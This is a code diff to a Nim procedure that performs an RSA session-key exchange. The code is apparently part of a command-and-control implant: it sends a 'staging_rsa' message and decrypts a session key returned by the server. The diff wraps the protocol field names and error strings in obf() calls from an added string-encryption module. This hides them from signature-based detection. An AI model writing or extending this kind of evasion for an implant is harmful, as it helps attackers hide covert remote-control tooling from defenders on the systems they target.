@@ -2,6 +2,7 @@
 import json, base64, strutils, random
 import debug
 import rsa
+import strenc
 
 type
   KeyExchangeResult* = object
@@ -61,9 +62,9 @@ proc performRsaKeyExchange*(config: Config, uuid: string, sendProc: proc(data: s
     
     # Build staging_rsa message (JSON format matching oopsie)
     let stagingRsa = %*{
-      "action": "staging_rsa",
-      "session_id": sessionId,
-      "pub_key": rsaKey.publicKeyPem
+      obf("action"): obf("staging_rsa"),
+      obf("session_id"): sessionId,
+      obf("pub_key"): rsaKey.publicKeyPem
     }
     
     let stagingStr = $stagingRsa
@@ -86,13 +87,13 @@ proc performRsaKeyExchange*(config: Config, uuid: string, sendProc: proc(data: s
     try:
       let responseJson = parseJson(response)
       
-      if not responseJson.hasKey("session_key"):
-        result.error = "Response missing 'session_key' field"
+      if not responseJson.hasKey(obf("session_key")):
+        result.error = obf("Response missing 'session_key' field")
         debug "[DEBUG] ", result.error
         debug "[DEBUG] Response: ", response
         return
       
-      let encryptedKeyB64 = responseJson["session_key"].getStr()
+      let encryptedKeyB64 = responseJson[obf("session_key")].getStr()
       
       debug "[DEBUG] Encrypted session key (Base64): ", encryptedKeyB64[0..min(100, encryptedKeyB64.len-1)]
       
@@ -107,7 +108,7 @@ proc performRsaKeyExchange*(config: Config, uuid: string, sendProc: proc(data: s
       let decryptedKey = rsaDecryptPrivate(rsaKey, cast[seq[byte]](encryptedKey))
       
       if decryptedKey.len == 0:
-        result.error = "Failed to decrypt session key"
+        result.error = obf("Failed to decrypt session key")
         debug "[DEBUG] ", result.error
         return
       
